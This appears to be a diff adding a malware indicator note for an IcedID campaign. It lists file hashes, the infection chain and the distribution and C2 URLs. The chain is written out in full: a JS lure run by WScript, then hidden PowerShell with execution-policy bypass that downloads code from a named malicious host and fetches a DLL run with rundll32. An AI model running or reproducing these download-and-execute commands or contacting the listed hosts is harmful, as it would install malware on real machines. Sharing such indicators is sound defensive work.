@@ -1,0 +1,35 @@
+IcedID | 17.03.2023 | Campaign 946873669
+
+***************************************
+
+.html 1932c57d6e7ebf0940e3898ece2aa0021201c5c1ea7190972a6f32861a668769 - Document_17-03-2023_15-51-55.html
+.zip 25b6e2be767d85f668b15e3acee6076a7e74f12128ec067775c6ec24e0707c4b
+.js f1481a3f86cdaee1e707bb93e26adedf3bb7665ed840431c6c1c473a41e9fa67
+.exe 9e66b2a30d5244d1dffb968cc1c67fe705ce208eed450ae81f9f48552187749b
+
+***************************************
+
+Exec >>
+
+WScript.exe C:\Users\Admin\Desktop\Unpaid_03_17_Copy#82.js
+
+cmd.exe /C powershell -nop -w hidden -ep bypass -enc SIEX (New-Object Net.Webclient).downloadstring("http://conalom.top/gatef1.php")
+
+$path = $Env:temp+'\XMUHQTs.dat'; 
+$client = New-Object System.Net.WebClient; $client.downloadfile('http://conalom.top/dll/48.dll',$path); 
+
+rundll32.exe $path,init 
+
+***************************************
+
+distro urls
+
+http://conalom.top/gatef1.php
+http://conalom.top/dll/48.dll
+
+***************************************
+
+c2 downloader
+
+http://umoxlopator.com
+
